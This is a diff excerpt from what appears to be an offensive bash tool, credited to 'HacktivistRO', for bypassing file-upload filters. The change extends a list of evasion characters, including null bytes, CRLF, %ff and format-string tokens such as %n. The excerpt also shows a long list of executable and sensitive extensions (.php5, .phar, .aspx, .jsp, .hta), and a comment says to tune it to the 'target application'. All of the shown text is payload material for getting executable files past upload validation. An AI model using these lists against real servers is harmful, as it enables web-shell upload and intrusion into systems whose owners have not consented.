@@ -11,7 +11,7 @@ echo "                          -By HacktivistRO"
 intro
 echo "Bypassing filters for File Upload Vulnerability since 2023"
 
-bypass_char=( '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' '....' '......' '#' '\x00' '…:.' '*')
+bypass_char=( '%20' '%0d' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':' '....' '......' '#' '\x00' '…:.' '*' '%' '%7f' '%ff' '%n' '%s' '%x' ',' '-' ';' '_' )
 
 # Change this line with list of extension according to the technology of the target application. If not sure, leave it as is.
 tech_ext=( '.aSP' '.aSa' '.aSp' '.aSpx' '.action' '.asa' '.asax' '.ashx' '.asmx' '.asp' '.aspx' '.axd' '.backup' '.bak' '.base.js' '.bat' '.c' '.cFc' '.cFm' '.cFml' '.cGi' '.cfc' '.cfc.' '.cfg' '.cfm' '.cfml' '.cgi' '.class' '.com' '.conf' '.config' '.cs' '.css' '.dBm' '.dbm' '.dll' '.do' '.exe' '.faces' '.hta' '.htm' '.html' '.iNc' '.ifaces' '.inc' '.inc' '.jSp' '.jSpa' '.jSpf' '.jSpfa' '.jSpx' '.jSpxa' '.jSv' '.jSva' '.jSw' '.jSwa' '.jar' '.java' '.jhtml' '.jpeg' '.jpg' '.js' '.jsa' '.jsf' '.json' '.jsp' '.jspa' '.jspf' '.jspfa' '.jspx' '.jspxa' '.jsv' '.jsva' '.jsw' '.jswa' '.lIb' '.lib' '.lock' '.log' '.md' '.mdb' '.nsf' '.old' '.pHp' '.pHp3' '.pHp4' '.pHp5' '.pHtml' '.pL' '.pM' '.passwd' '.pcap' '.pdf' '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phar' '.pht' '.phtml' '.pl' '.png' '.properties' '.reg' '.resx' '.seam' '.sh' '.sht' '.shtml' '.sln' '.sql' '.svf' '.swf' '.txt' '.wadl' '.wasm' '.web' '.wsdl' '.xhtml' '.xml' '.xsd' '.war' '.yaml' '.yml' '.zip' )
